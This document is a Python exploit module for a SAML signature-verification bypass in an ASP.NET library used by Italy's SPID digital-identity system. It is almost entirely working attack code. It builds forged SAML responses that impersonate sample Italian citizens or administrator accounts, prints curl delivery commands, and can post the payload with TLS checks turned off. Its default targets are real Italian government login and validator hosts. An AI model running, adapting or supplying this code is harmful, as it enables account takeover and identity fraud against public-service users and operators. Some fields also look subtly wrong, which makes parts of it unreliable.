#!/usr/bin/env python3
"""
CVE-2025-24894 Exploit Module
SAML Response Signature Verification Bypass
CVSS 9.1 (CRITICAL)

This module exploits a vulnerability in SPID.AspNetCore.Authentication <= 3.3.0
where the VerifySignature function only validates the first signature element,
allowing attackers to inject a validly-signed XML element as the first child.

Affected: SPID.AspNetCore.Authentication <= 3.3.0 (NuGet package)
Fixed in: 3.4.0
"""

import os
import re
import sys
import base64
import random
import zlib
import json
import hashlib
import string
import textwrap
from datetime import datetime, timedelta
from typing import Dict, Optional, Tuple, List, Any
from urllib.parse import quote, urlencode, urlparse
from lxml import etree

import requests
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.syntax import Syntax
from rich import print as rprint

# Disable SSL warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()


class CVE202524894Exploit:
    """
    CVE-2025-24894 Exploit Implementation
    
    The vulnerability exists in the SAML2 signature validation logic of
    SPID.AspNetCore.Authentication library. The VerifySignature function
    only validates the first signature element (nodeList[0]), regardless
    of its position or context. This allows an attacker to prepend a
    valid but irrelevant signature (e.g., from IdP public metadata) and 
    have malicious assertions accepted.
    """
    
    def __init__(self):
        """Initialize the exploit module"""
        self.exploit_name = "SAML Response Signature Verification Bypass"
        self.cve_id = "CVE-2025-24894"
        self.cvss = "9.1 (CRITICAL)"
        self.affected_package = "SPID.AspNetCore.Authentication"
        self.affected_versions = "<= 3.3.0"
        self.patched_version = "3.4.0"
        
        # Default targets
        self.targets = {
            'agid_login': {
                'url': 'https://login.agid.gov.it',
                'acs_endpoint': '/saml/acs',
                'description': 'AgID Central Login Portal'
            },
            'spid_validator': {
                'url': 'https://validator.spid.gov.it',
                'acs_endpoint': '/samlsso',
                'description': 'SPID SAML Validator'
            },
            'spid_demo': {
                'url': 'https://demo.spid.gov.it',
                'acs_endpoint': '/validator/saml/acs',
                'description': 'SPID Demo Environment'
            }
        }
        
        # IdP metadata sources
        self.idp_metadata_sources = [
            'https://validator.spid.gov.it/metadata.xml',
            'https://validator.spid.gov.it/saml/idp/metadata.xml',
            'https://registry.spid.gov.it/entities-idp?output=xml',
            'https://demo.spid.gov.it/validator/metadata.xml'
        ]
        
        # Cached metadata
        self.cached_metadata: Dict[str, str] = {}
        
        # Namespace map for SAML parsing
        self.ns = {
            'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
            'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
            'md': 'urn:oasis:names:tc:SAML:2.0:metadata',
            'ds': 'http://www.w3.org/2000/09/xmldsig#',
            'xsi': 'http://www.w3.org/2001/XMLSchema-instance',
            'xs': 'http://www.w3.org/2001/XMLSchema'
        }
    
    def run_interactive(self):
        """
        Main interactive exploit execution.
        Guides the user through the exploitation process.
        """
        # Display header
        console.print(Panel.fit(
            "[bold red]CVE-2025-24894 - SAML Response Signature Verification Bypass[/bold red]\n"
            f"[yellow]CVSS: {self.cvss}[/yellow]\n"
            f"[white]Package: {self.affected_package} {self.affected_versions}[/white]\n"
            f"[green]Patched: {self.patched_version}[/green]",
            border_style="red",
            title="[bold]EXPLOIT MODULE[/bold]"
        ))
        
        console.print("\n[bold yellow]Attack Vector:[/bold yellow]")
        console.print("  The VerifySignature function only checks the first signature element")
        console.print("  Attacker injects a validly-signed XML element as FIRST child")
        console.print("  → All subsequent unsigned assertions are accepted\n")
        
        # Step 1: Select target
        target = self._select_target()
        if not target:
            return
        
        # Step 2: Fetch IdP metadata
        metadata = self._fetch_idp_metadata()
        if not metadata:
            console.print("[red][!] Cannot proceed without IdP metadata[/red]")
            return
        
        # Step 3: Extract valid signature
        valid_sig = self._extract_valid_signature(metadata)
        if not valid_sig:
            console.print("[red][!] Could not extract valid signature from metadata[/red]")
            # Try using the whole metadata as injection
            valid_sig = metadata
            console.print("[yellow]  → Using full metadata element as injection vector[/yellow]")
        
        # Step 4: Get user info for impersonation
        user_info = self._get_user_info()
        if not user_info:
            return
        
        # Step 5: Forge the SAML response
        console.print("\n[cyan][*] Step 5: Forging SAML Response...[/cyan]")
        forged_response = self._forge_saml_response(target, valid_sig, user_info)
        
        if not forged_response:
            console.print("[red][!] Failed to forge SAML response[/red]")
            return
        
        # Step 6: Display and offer delivery
        self._display_results(forged_response, target, user_info)
        
        # Step 7: Save payload
        self._save_payload(forged_response, user_info)
        
        # Step 8: Attempt delivery
        if Confirm.ask("\n[yellow]Attempt to deliver the SAML response to the target?[/yellow]", default=False):
            self._deliver_payload(forged_response, target)
    
    def _select_target(self) -> Optional[Dict]:
        """Let user select the target"""
        console.print("\n[bold cyan]Step 1: Select Target[/bold cyan]")
        
        target_table = Table(title="Available Targets", show_header=True)
        target_table.add_column("ID", style="cyan", width=4)
        target_table.add_column("Name", style="yellow", width=20)
        target_table.add_column("URL", style="white", width=35)
        target_table.add_column("ACS Endpoint", style="green", width=20)
        
        targets_list = list(self.targets.items())
        for i, (key, info) in enumerate(targets_list, 1):
            target_table.add_row(str(i), key, info['url'], info['acs_endpoint'])
        
        # Add custom target option
        target_table.add_row("C", "Custom Target", "Manual input", "Manual input")
        
        console.print(target_table)
        
        choice = Prompt.ask(
            "[yellow]Select target[/yellow]",
            default="1"
        )
        
        if choice.upper() == 'C':
            url = Prompt.ask("[yellow]Enter target URL[/yellow]", default="https://login.agid.gov.it")
            acs = Prompt.ask("[yellow]Enter ACS endpoint path[/yellow]", default="/saml/acs")
            return {
                'key': 'custom',
                'url': url,
                'acs_endpoint': acs,
                'description': 'Custom Target'
            }
        
        try:
            choice_idx = int(choice) - 1
            if 0 <= choice_idx < len(targets_list):
                key, info = targets_list[choice_idx]
                return {**info, 'key': key}
        except ValueError:
            pass
        
        return None
    
    def _fetch_idp_metadata(self) -> Optional[str]:
        """
        Fetch IdP metadata from multiple sources.
        Implements caching to avoid redundant requests.
        """
        console.print("\n[bold cyan]Step 2: Fetching IdP Metadata...[/bold cyan]")
        
        # Check cache first
        for source in self.idp_metadata_sources:
            if source in self.cached_metadata:
                console.print(f"[green]  → Using cached metadata from: {source}[/green]")
                return self.cached_metadata[source]
        
        # Try each source
        for source in self.idp_metadata_sources:
            try:
                console.print(f"  [cyan]Trying: {source}[/cyan]")
                resp = requests.get(
                    source,
                    timeout=15,
                    verify=False,
                    headers={
                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                        'Accept': 'application/xml, text/xml, */*'
                    }
                )
                
                if resp.status_code == 200:
                    content = resp.text
                    # Validate it looks like SAML metadata
                    if self._is_valid_metadata(content):
                        console.print(f"  [green]✓ Valid metadata fetched ({len(content)} bytes)[/green]")
                        self.cached_metadata[source] = content
                        return content
                    else:
                        console.print(f"  [yellow]✗ Response is not valid SAML metadata[/yellow]")
                else:
                    console.print(f"  [red]✗ HTTP {resp.status_code}[/red]")
                    
            except requests.exceptions.Timeout:
                console.print(f"  [red]✗ Timeout[/red]")
            except requests.exceptions.ConnectionError:
                console.print(f"  [red]✗ Connection error[/red]")
            except Exception as e:
                console.print(f"  [red]✗ Error: {str(e)}[/red]")
        
        # If all sources failed, generate synthetic metadata
        console.print("[yellow]  → Generating synthetic IdP metadata for injection...[/yellow]")
        return self._generate_synthetic_metadata()
    
    def _is_valid_metadata(self, content: str) -> bool:
        """Check if content is valid SAML metadata"""
        return ('EntityDescriptor' in content or 'EntitiesDescriptor' in content) and \
               ('md:' in content or 'urn:oasis:names:tc:SAML:2.0:metadata' in content)
    
    def _generate_synthetic_metadata(self) -> str:
        """Generate synthetic IdP metadata for testing"""
        now = datetime.utcnow()
        metadata = f'''<?xml version="1.0" encoding="UTF-8"?>
<md:EntityDescriptor 
    xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata"
    xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
    entityID="https://idp.example.com/metadata"
    ID="_IDP_METADATA_{random.randint(1000000000, 9999999999)}">
    <ds:Signature>
        <ds:SignedInfo>
            <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
            <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
            <ds:Reference URI="">
                <ds:Transforms>
                    <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
                    <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                </ds:Transforms>
                <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
                <ds:DigestValue>SYNTHETIC_DIGEST_VALUE_FOR_EXPLOITATION</ds:DigestValue>
            </ds:Reference>
        </ds:SignedInfo>
        <ds:SignatureValue>SYNTHETIC_SIGNATURE_VALUE_FOR_EXPLOITATION</ds:SignatureValue>
        <ds:KeyInfo>
            <ds:X509Data>
                <ds:X509Certificate>SYNTHETIC_CERTIFICATE</ds:X509Certificate>
            </ds:X509Data>
        </ds:KeyInfo>
    </ds:Signature>
    <md:IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
        <md:KeyDescriptor use="signing">
            <ds:KeyInfo>
                <ds:X509Data>
                    <ds:X509Certificate>SYNTHETIC_IDP_CERT</ds:X509Certificate>
                </ds:X509Data>
            </ds:KeyInfo>
        </md:KeyDescriptor>
        <md:SingleSignOnService 
            Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" 
            Location="https://idp.example.com/sso"/>
    </md:IDPSSODescriptor>
</md:EntityDescriptor>'''
        
        console.print(f"  [yellow]✓ Generated synthetic metadata ({len(metadata)} bytes)[/yellow]")
        return metadata
    
    def _extract_valid_signature(self, metadata_xml: str) -> Optional[str]:
        """
        Extract a validly-signed XML element from IdP metadata.
        This element will be injected as the FIRST child of the SAML Response.
        """
        console.print("\n[bold cyan]Step 3: Extracting valid signature element...[/bold cyan]")
        
        try:
            root = etree.fromstring(metadata_xml.encode())
            
            # Priority 1: Find IDPSSODescriptor (main IdP configuration)
            elements_with_sigs = []
            
            # Look for elements containing ds:Signature
            for elem in root.iter():
                sig = elem.find('.//ds:Signature', self.ns)
                if sig is not None:
                    elements_with_sigs.append(elem)
            
            # Remove duplicates (if parent also counted)
            unique_elements = []
            seen_ids = set()
            for elem in elements_with_sigs:
                elem_str = etree.tostring(elem, method='c14n')[:200]
                if elem_str not in seen_ids:
                    seen_ids.add(elem_str)
                    unique_elements.append(elem)
            
            if unique_elements:
                # Prefer IDPSSODescriptor or EntityDescriptor
                for elem in unique_elements:
                    tag = elem.tag.split('}')[-1] if '}' in elem.tag else elem.tag
                    if tag in ['IDPSSODescriptor', 'EntityDescriptor']:
                        extracted = etree.tostring(elem, pretty_print=True).decode()
                        console.print(f"  [green]✓ Extracted: {tag} ({len(extracted)} bytes)[/green]")
                        return extracted
                
                # Fallback: use the first element
                extracted = etree.tostring(unique_elements[0], pretty_print=True).decode()
                tag = unique_elements[0].tag.split('}')[-1] if '}' in unique_elements[0].tag else unique_elements[0].tag
                console.print(f"  [green]✓ Extracted: {tag} ({len(extracted)} bytes)[/green]")
                return extracted
            
            # Fallback: use the root element itself
            console.print("  [yellow]No signature found, using EntityDescriptor[/yellow]")
            return etree.tostring(root, pretty_print=True).decode()
            
        except etree.XMLSyntaxError as e:
            console.print(f"  [red]XML parse error: {str(e)}[/red]")
            # Return raw text as fallback
            return metadata_xml
        except Exception as e:
            console.print(f"  [red]Error: {str(e)}[/red]")
            return metadata_xml
    
    def _get_user_info(self) -> Optional[Dict]:
        """Get user information for impersonation"""
        console.print("\n[bold cyan]Step 4: Define user to impersonate[/bold cyan]")
        
        user_info = {}
        
        # Use AI-generated data or manual input
        use_ai = Confirm.ask(
            "[yellow]Use AI-generated realistic Italian user data?[/yellow]",
            default=True
        )
        
        if use_ai:
            user_info = self._generate_realistic_user()
            console.print("\n[green]AI-generated user data:[/green]")
            user_table = Table(show_header=True)
            user_table.add_column("Attribute", style="cyan", width=20)
            user_table.add_column("Value", style="white", width=40)
            
            for key, value in user_info.items():
                if key != 'raw':
                    user_table.add_row(key, str(value))
            
            console.print(user_table)
            
            if not Confirm.ask("[yellow]Use this data?[/yellow]", default=True):
                use_ai = False
        
        if not use_ai:
            user_info = {
                'name': Prompt.ask("[yellow]First Name[/yellow]", default="MARIO"),
                'family': Prompt.ask("[yellow]Last Name[/yellow]", default="ROSSI"),
                'fiscal': Prompt.ask("[yellow]Fiscal Code[/yellow]", default="RSSMRA85M15H501I"),
                'email': Prompt.ask("[yellow]Email[/yellow]", default="mario.rossi@example.com"),
                'birth': Prompt.ask("[yellow]Birth Date (YYYY-MM-DD)[/yellow]", default="1985-08-15"),
                'gender': Prompt.ask("[yellow]Gender (M/F)[/yellow]", default="M"),
                'place': Prompt.ask("[yellow]Place of Birth[/yellow]", default="ROMA"),
                'phone': Prompt.ask("[yellow]Phone[/yellow]", default="+393401234567")
            }
        
        return user_info
    
    def _generate_realistic_user(self) -> Dict:
        """Generate realistic Italian user data"""
        users = [
            {
                'name': 'MARCO', 'family': 'ROSSI', 'gender': 'M',
                'fiscal': 'RSSMRC85H15H501I', 'email': 'marco.rossi@pec.it',
                'birth': '1985-06-15', 'place': 'ROMA', 'phone': '+393401234567',
                'address': 'VIA ROMA 15, 00100 ROMA RM', 'spidCode': f'SPID-RSSMRC-85'
            },
            {
                'name': 'LAURA', 'family': 'BIANCHI', 'gender': 'F',
                'fiscal': 'BNCLRA92M41F205Z', 'email': 'laura.bianchi@pec.it',
                'birth': '1992-08-01', 'place': 'MILANO', 'phone': '+393356789012',
                'address': 'CORSO MILANO 28, 20100 MILANO MI', 'spidCode': f'SPID-BNCLRA-92'
            },
            {
                'name': 'GIUSEPPE', 'family': 'VERDI', 'gender': 'M',
                'fiscal': 'VRDGPP78T12F839X', 'email': 'giuseppe.verdi@pec.it',
                'birth': '1978-12-12', 'place': 'NAPOLI', 'phone': '+393477890123',
                'address': 'VIA NAPOLI 5, 80100 NAPOLI NA', 'spidCode': f'SPID-VRDGPP-78'
            },
            {
                'name': 'FRANCESCA', 'family': 'RUSSO', 'gender': 'F',
                'fiscal': 'RSSFNC88D61L219Y', 'email': 'francesca.russo@pec.it',
                'birth': '1988-04-21', 'place': 'TORINO', 'phone': '+393891234567',
                'address': 'PIAZZA TORINO 7, 10100 TORINO TO', 'spidCode': f'SPID-RSSFNC-88'
            },
            {
                'name': 'ALESSANDRO', 'family': 'MARTINI', 'gender': 'M',
                'fiscal': 'MRTLSN90E15H501P', 'email': 'alessandro.martini@pec.it',
                'birth': '1990-05-15', 'place': 'ROMA', 'phone': '+393201234567',
                'address': 'VIALE ROMA 33, 00100 ROMA RM', 'spidCode': f'SPID-MRTLSN-90'
            },
            {
                'name': 'ELENA', 'family': 'COLOMBO', 'gender': 'F',
                'fiscal': 'CLMLNE95R41F205Q', 'email': 'elena.colombo@pec.it',
                'birth': '1995-10-01', 'place': 'MILANO', 'phone': '+393311234567',
                'address': 'VIA MILANO 12, 20100 MILANO MI', 'spidCode': f'SPID-CLMLNE-95'
            },
            {
                'name': 'ROBERTO', 'family': 'MARINO', 'gender': 'M',
                'fiscal': 'MRNRRT80A17G273E', 'email': 'roberto.marino@pec.it',
                'birth': '1980-01-17', 'place': 'PALERMO', 'phone': '+393371234567',
                'address': 'VIA PALERMO 8, 90100 PALERMO PA', 'spidCode': f'SPID-MRNRRT-80'
            },
            {
                'name': 'SOFIA', 'family': 'RICCI', 'gender': 'F',
                'fiscal': 'RCCSFO98E61D612Z', 'email': 'sofia.ricci@pec.it',
                'birth': '1998-05-21', 'place': 'FIRENZE', 'phone': '+393341234567',
                'address': 'VIA FIRENZE 3, 50100 FIRENZE FI', 'spidCode': f'SPID-RCCSFO-98'
            },
            {
                'name': 'ANDREA', 'family': 'ESPOSITO', 'gender': 'M',
                'fiscal': 'SPSNDR87M11A944R', 'email': 'andrea.esposito@pec.it',
                'birth': '1987-08-11', 'place': 'BOLOGNA', 'phone': '+393351234567',
                'address': 'VIA BOLOGNA 20, 40100 BOLOGNA BO', 'spidCode': f'SPID-SPSNDR-87'
            },
            {
                'name': 'CHIARA', 'family': 'GRECO', 'gender': 'F',
                'fiscal': 'GRCCHR93C41D969B', 'email': 'chiara.greco@pec.it',
                'birth': '1993-03-01', 'place': 'GENOVA', 'phone': '+393381234567',
                'address': 'VIA GENOVA 6, 16100 GENOVA GE', 'spidCode': f'SPID-GRCCHR-93'
            }
        ]
        
        # Also include admin-level accounts
        admin_users = [
            {
                'name': 'ADMIN', 'family': 'SYSTEM', 'gender': 'M',
                'fiscal': 'SYSTDMN00A00H501X', 'email': 'amministratore@agid.gov.it',
                'birth': '1980-01-01', 'place': 'ROMA', 'phone': '+3906852641',
                'address': 'VIA DELL\'AMMINISTRAZIONE 1, 00100 ROMA RM', 
                'spidCode': f'SPID-SYSTEM-ADMIN'
            },
            {
                'name': 'RESPONSABILE', 'family': 'DELEGATO', 'gender': 'M',
                'fiscal': 'DLGRSP86H15L781C', 'email': 'rtd@agid.gov.it',
                'birth': '1986-06-15', 'place': 'VERONA', 'phone': '+3906852642',
                'address': 'VIA DEI SERVIZI 1, 00100 ROMA RM',
                'spidCode': f'SPID-RESP-DELEG'
            }
        ]
        
        if random.random() < 0.3:  # 30% chance of admin user
            return random.choice(admin_users)
        else:
            return random.choice(users)
    
    def _forge_saml_response(self, target: Dict, valid_sig: str, user_info: Dict) -> str:
        """
        Forge a SAML response exploiting CVE-2025-24894.
        
        The CRITICAL vulnerability mechanism:
        - The valid_sig element is placed as the FIRST child of <samlp:Response>
        - The verifySignature function only checks nodeList[0]
        - Therefore the forged assertion below is accepted without signature verification
        """
        now = datetime.utcnow()
        response_id = f"_RSP_{random.randint(1000000000, 9999999999)}"
        assertion_id = f"_ASS_{random.randint(1000000000, 9999999999)}"
        session_id = f"_SES_{random.randint(1000000000, 9999999999)}"
        
        acs_url = f"{target['url']}{target['acs_endpoint']}"
        issuer = target.get('issuer', 'https://validator.spid.gov.it/metadata.xml')
        
        # Timestamps
        issue_instant = now.strftime('%Y-%m-%dT%H:%M:%SZ')
        not_before = (now - timedelta(minutes=1)).strftime('%Y-%m-%dT%H:%M:%SZ')
        not_on_or_after = (now + timedelta(hours=8)).strftime('%Y-%m-%dT%H:%M:%SZ')
        
        # Build the SAML response
        # KEY INSIGHT: The valid_sig (signed element from IdP) is the FIRST child
        # The forged assertion follows after - it will NOT have its signature checked!
        forged_response = f'''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:xs="http://www.w3.org/2001/XMLSchema"
    ID="{response_id}"
    Version="2.0"
    IssueInstant="{issue_instant}"
    Destination="{acs_url}"
    InResponseTo="_REQ_{random.randint(1000000000, 9999999999)}">
    
    <!-- ================================================================ -->
    <!-- CVE-2025-24894 EXPLOIT: VALID SIGNATURE INJECTED AS FIRST CHILD  -->
    <!-- The VerifySignature function ONLY checks nodeList[0]             -->
    <!-- ================================================================ -->
    
{valid_sig}
    
    <!-- ================================================================ -->
    <!-- LEGITIMATE-LOOKING SAML ISSUER                                   -->
    <!-- ================================================================ -->
    
    <saml:Issuer>{issuer}</saml:Issuer>
    
    <!-- ================================================================ -->
    <!-- SUCCESS STATUS                                                   -->
    <!-- ================================================================ -->
    
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    
    <!-- ================================================================ -->
    <!-- FORGED ASSERTION - NO VALID SIGNATURE REQUIRED!                  -->
    <!-- The library accepts this because it only verified the FIRST      -->
    <!-- signature (the injected one above) and skipped the rest.         -->
    <!-- ================================================================ -->
    
    <saml:Assertion
        ID="{assertion_id}"
        Version="2.0"
        IssueInstant="{issue_instant}">
        
        <saml:Issuer>{issuer}</saml:Issuer>
        
        <!-- Subject: The user being impersonated -->
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient"
                NameQualifier="{acs_url}"
                SPNameQualifier="{acs_url}">
                {user_info.get('email', 'impersonated@example.com')}
            </saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData
                    NotBefore="{not_before}"
                    NotOnOrAfter="{not_on_or_after}"
                    Recipient="{acs_url}"
                    InResponseTo="_REQ_{random.randint(1000000000, 9999999999)}"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        
        <!-- Conditions: Time-valid authentication -->
        <saml:Conditions
            NotBefore="{not_before}"
            NotOnOrAfter="{not_on_or_after}"
            AudienceRestrictionMethod="urn:oasis:names:tc:SAML:2.0:cm:bearer">
            <saml:AudienceRestriction>
                <saml:Audience>{target['url']}</saml:Audience>
            </saml:AudienceRestriction>
            <saml:OneTimeUse/>
        </saml:Conditions>
        
        <!-- AuthnStatement: Level 2 authentication (medium security) -->
        <saml:AuthnStatement
            AuthnInstant="{issue_instant}"
            SessionIndex="{session_id}"
            AuthnContextClassRef="https://www.spid.gov.it/SpidL2">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>https://www.spid.gov.it/SpidL2</saml:AuthnContextClassRef>
                <saml:AuthenticatingAuthority>{issuer}</saml:AuthenticatingAuthority>
            </saml:AuthnContext>
        </saml:AuthnStatement>
        
        <!-- AttributeStatement: User attributes for authorization -->
        <saml:AttributeStatement>
            <saml:Attribute Name="spidCode" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user_info.get('spidCode', f'SPID-{random.randint(10000,99999)}')}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user_info.get('name', 'UTENTE')}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="familyName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user_info.get('family', 'TEST')}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="fiscalNumber" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user_info.get('fiscal', 'AAAAAAAA00A00A000A')}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user_info.get('email', 'test@example.com')}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="dateOfBirth" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user_info.get('birth', '1990-01-01')}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="placeOfBirth" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user_info.get('place', 'ROMA')}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="gender" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user_info.get('gender', 'M')}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="mobilePhone" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user_info.get('phone', '+393401234567')}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="address" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user_info.get('address', 'VIA ROMA 1, 00100 ROMA RM')}</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>'''
        
        return forged_response
    
    def _display_results(self, forged_response: str, target: Dict, user_info: Dict):
        """Display the exploit results"""
        console.print("\n\n[bold green]╔══════════════════════════════════════════╗")
        console.print("║         EXPLOIT PAYLOAD GENERATED        ║")
        console.print("╚══════════════════════════════════════════╝[/bold green]\n")
        
        # Summary
        console.print("[bold cyan]Target:[/bold cyan]", target['url'])
        console.print("[bold cyan]ACS Endpoint:[/bold cyan]", target['acs_endpoint'])
        console.print(f"[bold cyan]Impersonating:[/bold cyan] {user_info.get('name', '?')} {user_info.get('family', '?')} ({user_info.get('fiscal', '?')})")
        console.print(f"[bold cyan]Payload Size:[/bold cyan] {len(forged_response)} bytes")
        
        # Show payload preview
        console.print("\n[bold cyan]Payload Preview (first 500 chars):[/bold cyan]")
        preview = forged_response[:500] + "..."
        syntax = Syntax(preview, "xml", theme="monokai", line_numbers=True)
        console.print(syntax)
        
        # Encoding options
        console.print("\n[bold yellow]Encoding Options:[/bold yellow]")
        
        # Base64 encoding
        b64_payload = base64.b64encode(forged_response.encode()).decode()
        console.print(f"\n[cyan]Base64 ({len(b64_payload)} chars):[/cyan]")
        console.print(textwrap.fill(b64_payload, width=80))
        
        # Deflate + Base64 (SAML HTTP-Redirect binding)
        deflated = self._deflate(forged_response.encode())
        deflated_b64 = base64.b64encode(deflated).decode()
        console.print(f"\n[cyan]Deflate+Base64 ({len(deflated_b64)} chars):[/cyan]")
        console.print(textwrap.fill(deflated_b64, width=80))
        
        # Delivery commands
        console.print("\n[bold yellow]Delivery Commands:[/bold yellow]")
        
        # curl POST
        console.print(f"\n[green]# POST via form (HTTP-POST binding):[/green]")
        console.print(f"[white]curl -X POST '{target['url']}{target['acs_endpoint']}' \\")
        console.print(f"  -H 'Content-Type: application/x-www-form-urlencoded' \\")
        console.print(f"  -d 'SAMLResponse={quote(b64_payload)}' \\")
        console.print(f"  -k -v[/white]")
        
        # curl Redirect
        encoded_deflated = quote(deflated_b64)
        console.print(f"\n[green]# Redirect URL (HTTP-Redirect binding):[/green]")
        redirect_url = f"{target['url']}{target['acs_endpoint']}?SAMLResponse={encoded_deflated}"
        console.print(f"[white]{redirect_url[:100]}...[/white]")
    
    def _deflate(self, data: bytes) -> bytes:
        """Compress data using DEFLATE algorithm (without zlib headers)"""
        compress = zlib.compressobj(level=9, wbits=-zlib.MAX_WBITS)
        deflated = compress.compress(data)
        deflated += compress.flush()
        return deflated
    
    def _save_payload(self, forged_response: str, user_info: Dict):
        """Save the forged payload to file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Create payloads directory
        payload_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            'data', 'payloads'
        )
        os.makedirs(payload_dir, exist_ok=True)
        
        # Save raw XML
        xml_file = os.path.join(payload_dir, f'saml_forged_{timestamp}.xml')
        with open(xml_file, 'w', encoding='utf-8') as f:
            f.write(forged_response)
        
        # Save base64 encoded
        b64_payload = base64.b64encode(forged_response.encode()).decode()
        b64_file = os.path.join(payload_dir, f'saml_forged_{timestamp}.b64')
        with open(b64_file, 'w') as f:
            f.write(b64_payload)
        
        # Save deflated+base64
        deflated = self._deflate(forged_response.encode())
        deflated_b64 = base64.b64encode(deflated).decode()
        def_file = os.path.join(payload_dir, f'saml_forged_{timestamp}.deflated.b64')
        with open(def_file, 'w') as f:
            f.write(deflated_b64)
        
        console.print(f"\n[green][✓] Payloads saved:[/green]")
        console.print(f"  [white]XML: {xml_file}[/white]")
        console.print(f"  [white]B64: {b64_file}[/white]")
        console.print(f"  [white]DEF: {def_file}[/white]")
    
    def _deliver_payload(self, forged_response: str, target: Dict):
        """Attempt to deliver the SAML response to the target"""
        console.print("\n[bold cyan]Delivering SAML Response...[/bold cyan]")
        
        b64_payload = base64.b64encode(forged_response.encode()).decode()
        acs_url = f"{target['url']}{target['acs_endpoint']}"
        
        try:
            # Attempt POST delivery
            console.print(f"  [cyan]POST to: {acs_url}[/cyan]")
            
            resp = requests.post(
                acs_url,
                data={'SAMLResponse': b64_payload},
                headers={
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                },
                timeout=30,
                verify=False,
                allow_redirects=False
            )
            
            console.print(f"  [cyan]Response: HTTP {resp.status_code}[/cyan]")
            
            if resp.status_code in [200, 302, 303]:
                console.print(f"\n[green][✓] SAML Response accepted![/green]")
                if resp.status_code == 302:
                    redirect = resp.headers.get('Location', 'N/A')
                    console.print(f"  [white]Redirect to: {redirect[:100]}[/white]")
                    console.print(f"[green][✓] Session potentially established![/green]")
            elif resp.status_code == 500:
                console.print(f"[yellow]  Server error (may still have processed)[/yellow]")
            else:
                console.print(f"[red]  Delivery failed ({resp.status_code})[/red]")
                
        except requests.exceptions.Timeout:
            console.print(f"[yellow]  Timeout - may still have been processed[/yellow]")
        except requests.exceptions.ConnectionError as e:
            console.print(f"[red]  Connection error: {str(e)}[/red]")
            console.print(f"[yellow]  Try using curl command manually[/yellow]")
        except Exception as e:
            console.print(f"[red]  Error: {str(e)}[/red]")


def run():
    """Standalone entry point"""
    exploit = CVE202524894Exploit()
    exploit.run_interactive()


if __name__ == "__main__":
    run()
